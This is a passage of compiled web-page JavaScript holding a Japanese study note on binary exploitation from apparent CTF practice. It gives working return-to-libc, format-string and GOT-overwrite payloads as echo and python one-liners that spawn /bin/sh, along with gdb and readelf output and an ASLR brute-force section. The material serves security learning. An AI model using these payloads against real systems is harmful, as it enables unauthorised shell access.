extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("$1 = {<text variable, no debug info>} 0xf7e16200 <system>\n")])])]),a("p",[t._v("さらに, system関数は第一引数に文字列を指定する必要があるため, とりあえずbuffer変数のアドレス(0x0804a060)を指定します。")]),t._v(" "),a("p",[t._v("すると, 以下のようなスタックの状況を作れれば攻撃が成功しそうです。")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",{staticStyle:{"text-align":"center"}},[t._v("内容")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("アドレス")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),a("tbody",[a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("下位のアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0x00000000")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("...")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("...")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("...")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("関数アドレス=リターンアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0xf7e16200")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("今回はsystem関数の場所")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("関数呼び出し後のリターンアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("BBBB")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("ダミー(あとでprintfと同じようにmain関数の番地にするかも)")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("引数1")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0x0804a060")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("buffer変数の番地")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("...")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("...")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("...")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("上位アドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0xffffffff")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("...")])])])]),t._v(" "),a("p",[t._v("したがって、攻撃文字列は以下のようになります。\n"),a("code",[t._v("/bin/sh(7文字) + \\x00(1文字) + A*(44-7-2＝36文字) + \\x00\\x62\\xe1\\xf7 + BBBB + \\x60\\xa0\\x04\\x08")])]),t._v(" "),a("p",[t._v("echoでかくと, 以下のようになる。")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("(echo -e '/bin/sh\\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00\\x62\\xe1\\xf7\\x39\\x85\\x04\\x08\\x60\\xa0\\x04\\x08'; cat) | ./bof\n")])])]),a("p",[t._v("pythonでかくと, 以下のようになる(echoの時は挿入されている\\n(改行コード)がないため, \\nを挿入している)。")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('(python -c \'import sys; sys.stdout.buffer.write(b"/bin/sh" + b"\\x00" + b"A"*36 + b"\\x00\\x62\\xe1\\xf7" + b"\\x39\\x85\\x04\\x08" + b"\\x60\\xa0\\x04\\x08\\n")\'; cat;) | ./bof\n')])])]),a("h2",{attrs:{id:"popret-gadget"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#popret-gadget"}},[t._v("#")]),t._v(" popret gadget")]),t._v(" "),a("h3",{attrs:{id:"概要"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#概要"}},[t._v("#")]),t._v(" 概要")]),t._v(" "),a("p",[t._v("先程までの例では, main関数のリターンアドレスとしてmain関数のアドレスを利用していた。\nしかし, このリターンアドレスに他の関数のリターンアドレスを埋め込んでおけば2つめの関数を呼び出すことが可能になる。")]),t._v(" "),a("p",[t._v("しかし、以下のように、単純に関数を設定するだけだとスタックの中身が散乱してしまう。")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",{staticStyle:{"text-align":"center"}},[t._v("SP")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("内容")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),a("tbody",[a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("下位のアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0x00000000")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数1のアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数1のリターンアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数2のアドレスを入れる")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数1の引数1")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数2のリターンアドレスを入れる")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数1の引数2")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数2の引数1を入れる")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数1の引数3")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数2の引数2を入れる")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})])])]),t._v(" "),a("p",[t._v("そこで, popret gadgetの考え方を使う。\n実行ファイルの中にpopを数回おこなった後にretするという処理(gadget)が多く現れる。これに倣い, 関数を呼び出すために使用した引数分popしてからretすればスタックポインタの位置をずらすことができそう。")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",{staticStyle:{"text-align":"center"}},[t._v("SP")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("内容")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),a("tbody",[a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("下位のアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0x00000000")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数1のアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数1のリターンアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("pop pop pop ret (pop3ret)")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("pop↓")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数1の引数1")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("pop↓")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数1の引数2")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("pop↓")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数1の引数3")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("ret→")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数2のアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数2のリターンアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数2の引数1")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数2の引数2")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("関数2の引数3")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})])])]),t._v(" "),a("p",[t._v("これを活用して, プログラムを以上終了させるためにexitを呼び出してみる。")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",{staticStyle:{"text-align":"center"}},[t._v("SP")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("内容")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("address")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("補足")])])]),t._v(" "),a("tbody",[a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("下位のアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0x00000000")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("systemのアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0xf7e16200")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}})]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("systemのリターンアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0x080485cb")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("pop ret(popret)")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("pop↓")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("systemの引数1")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0x0804a060")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("buffer")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("ret→")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("exitのアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0xf7e093d0")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("exit")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("exitのリターンアドレス")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0x08048539")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("main")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}}),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("exitの引数1")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("return 0")])])])]),t._v(" "),a("h2",{attrs:{id:"rop-return-oriented-programing"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#rop-return-oriented-programing"}},[t._v("#")]),t._v(" ROP(Return Oriented Programing)")]),t._v(" "),a("p",[t._v("???")]),t._v(" "),a("h1",{attrs:{id:"書式文字列攻撃"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#書式文字列攻撃"}},[t._v("#")]),t._v(" 書式文字列攻撃")]),t._v(" "),a("p",[a("code",[t._v("%p")]),t._v("は対応するスタックの値をvoid*型として16進数で表示する。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ python -c "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"print('AAAA' + '%p.'*20)\"")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./fsb \nAAAA0x80.0xf7fb15c0.0x80484e5.0xf7fdf409.0xf63d4e2e.0xf7ffdaf8.0x41414141.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("secret")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("0x12345678\ne\n")])])]),a("p",[t._v("これにより, AAAAが7番目の"),a("code",[t._v("%p")]),t._v("で読み込まれていることがわかるので, スタックの7番目の値を参照すれば良いことがわかる。")]),t._v(" "),a("h2",{attrs:{id:"任意のアドレスからの読み込み"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#任意のアドレスからの読み込み"}},[t._v("#")]),t._v(" 任意のアドレスからの読み込み")]),t._v(" "),a("p",[a("code",[t._v("%n$s")]),t._v("でn番目の値をchar*型で出力する。")]),t._v(" "),a("p",[t._v("そのため, 入力としてsecretのアドレスをあたえ, 7番目の値を参照すればおk。")]),t._v(" "),a("p",[t._v("~なぜか6番目で正しく実行できているので, 0-indexedなのかも?~~\n7番目でした。")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("$ echo -e '\\x24\\xa0\\x04\\x08%7$s' | ./fsb |  hexdump -C\n00000000  24 a0 04 08 78 56 34 12  0a 73 65 63 72 65 74 3d  |$...xV4..secret=|\n00000010  30 78 31 32 33 34 35 36  37 38 0a                 |0x12345678.|\n0000001b\n")])])]),a("p",[t._v("ここで, 00000005から\\x78\\x56\\x34\\x12が続いているため, その正当性が確認できる。")]),t._v(" "),a("h2",{attrs:{id:"自由な書き込み"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#自由な書き込み"}},[t._v("#")]),t._v(" 自由な書き込み")]),t._v(" "),a("p",[t._v("secret = 0x0804a024")]),t._v(" "),a("p",[a("code",[t._v("%n$n")]),t._v("で自由に書き込みができる。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" -e "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\x24\\xa0\\x04\\x08%7$s'")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./fsb \n$�xV4\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("secret")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("0x12345678\n$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" -e "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\x24\\xa0\\x04\\x08%7$n'")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./fsb \n$�\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("secret")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("0x4\n")])])]),a("h2",{attrs:{id:"got-overwrite"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#got-overwrite"}},[t._v("#")]),t._v(" GOT Overwrite")]),t._v(" "),a("h3",{attrs:{id:"what-s-got"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#what-s-got"}},[t._v("#")]),t._v(" What's GOT?")]),t._v(" "),a("p",[t._v("GOTとは, ライブラリの関数アドレスを保存しておく領域のこと。\nGOT領域を書き換えることで, eipを変更したことと同じことになる。")]),t._v(" "),a("h3",{attrs:{id:"攻撃手法の策定"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻撃手法の策定"}},[t._v("#")]),t._v(" 攻撃手法の策定")]),t._v(" "),a("p",[t._v("デコンパイルをすると, fgets→printf→fgets→strlen→printfという流れで関数が呼び出されていることがわかる。")]),t._v(" "),a("p",[t._v("したがって, 最初のfgetsで, 次にくるprintfでstrlenをsystem関数に書き換える攻撃コードを流し込み, 2度目のfgets関数でstrにsystem関数の引数を設定してstrlen(str)でシェルを起動する。")]),t._v(" "),a("p",[t._v("GOT領域は以下のコマンドで確認できる。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ readelf -r got\n\nRelocation section "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'.rel.dyn'")]),t._v(" at offset 0x318 contains "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v(" entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n08049ff8  00000406 R_386_GLOB_DAT    00000000   __gmon_start__\n08049ffc  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0\n\nRelocation section "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'.rel.plt'")]),t._v(" at offset 0x328 contains "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("5")]),t._v(" entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0\n0804a010  00000207 R_386_JUMP_SLOT   00000000   fgets@GLIBC_2.0\n0804a014  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4\n0804a018  00000507 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0\n0804a01c  00000607 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0\n")])])]),a("p",[t._v("これより, strlen関数が"),a("code",[t._v("0x0804a018")]),t._v("に書き込まれることがわかる。")]),t._v(" "),a("p",[t._v("次に, system関数のアドレスを確認する。\ngdbによって確認すると, "),a("code",[t._v("0xf7e16200")]),t._v("であることがわかる。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("gdb-peda$ p system\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$1")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("text variable, no debug info"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" 0xf7e16200 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("system"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n")])])]),a("p",[t._v("以上の情報を用いて, strlen関数をsystem関数で上書きする。\nアドレスが8バイトなので, "),a("code",[t._v("%hn")]),t._v("を用いて2回に分けて攻撃を行う。\n"),a("code",[t._v("0x0804a018~0x0804a019")]),t._v("に"),a("code",[t._v("0x6200")]),t._v(",\n"),a("code",[t._v("0x0804a01a~0x0804a01b")]),t._v("に"),a("code",[t._v("0xf7e1")]),t._v("を書き込む。")]),t._v(" "),a("p",[t._v("この文字列を入れる番地を知るために, 書式文字列攻撃を行う。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" -e "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p'")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./got \nAAAA,0x80,0xf7fb15c0,0x8048520,"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("nil"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",0xf7fdff9b,0x804822c,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("44")]),t._v("\n")])])]),a("p",[t._v("以上より, 7番目に引数が格納されることがわかった。")]),t._v(" "),a("h2",{attrs:{id:"攻撃手法のまとめ"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#攻撃手法のまとめ"}},[t._v("#")]),t._v(" 攻撃手法のまとめ")]),t._v(" "),a("p",[t._v("したがって, 攻撃文字列は以下な形式になる。")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",{staticStyle:{"text-align":"center"}},[t._v("書式文字列")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("補足")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("出力バイト数")]),t._v(" "),a("th",{staticStyle:{"text-align":"center"}},[t._v("積算出力バイト数")])])]),t._v(" "),a("tbody",[a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("0x0804a018")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("GOT領域のstrlen(1)")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("4")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("0x0804a01a")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("GOT領域のstrlen(2)")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("4")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("8")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("%25080x")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("25088-8=25080")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("25080")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("25088(=0x6200)")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("%7$hn")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("strlenの前半4バイトを埋める")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("25088")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("%38369x")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("63457-25088=38369")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("38369")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("63457(=0xf7e1)")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("%8$hn")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("strlenの後半4バイトを埋める")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("0")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("63457")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("\\n")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("2回目にくるfgets関数のために改行を入れておく")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("-")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("-")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"center"}},[t._v("/bin/sh; cat")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("shellを立ち上げる")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("-")]),t._v(" "),a("td",{staticStyle:{"text-align":"center"}},[t._v("-")])])])]),t._v(" "),a("p",[t._v("したがって, 攻撃コードは以下のようになる。")]),t._v(" "),a("h4",{attrs:{id:"echo-ver"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#echo-ver"}},[t._v("#")]),t._v(" echo ver.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("e$ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("echo -e "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\x18\\xa0\\x04\\x08\\x1a\\xa0\\x04\\x08%25080x%7$hn%38369x%8$hn\\n/bin/sh'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./got \n")])])]),a("h4",{attrs:{id:"python-ver"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#python-ver"}},[t._v("#")]),t._v(" python ver.")]),t._v(" "),a("p",[a("strong",[t._v("/bin/shの後に\\x00を入れることで, 文字列の分割を行なっている。")])]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("python -c "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'import sys;sys.stdout.buffer.write(b\"\\x18\\xa0\\x04\\x08\\x1a\\xa0\\x04\\x08%25080x%7$hn%38369x%8$hn\\n/bin/sh\\x00\\n\")'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./got\n")])])]),a("h2",{attrs:{id:"aslrの回避"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#aslrの回避"}},[t._v("#")]),t._v(" ASLRの回避")]),t._v(" "),a("p",[t._v("ブルートフォースで回避する。")]),t._v(" "),a("p",[t._v("以下のコマンドでASLRを有効にする。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" sysctl -w kernel.randomize_va_space"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("\n")])])]),a("p",[a("code",[t._v("ldd")]),t._v("コマンドを使用することで, 共有ライブラリのメモリアドレスを確認する。\nすると, randomizeされていることが確認できる。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sudo")]),t._v(" sysctl -w kernel.randomize_va_space"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("sudo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" password "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" task4233: \nkernel.randomize_va_space "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("\ntask4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5\n$ ldd bof4\n  linux-gate.so.1 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f0e000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  libc.so.6 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/i386-linux-gnu/libc.so.6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7d10000"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  /lib/ld-linux.so.2 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0xf7f10000"),a("span",{pre:!0,attrs:{class:"token 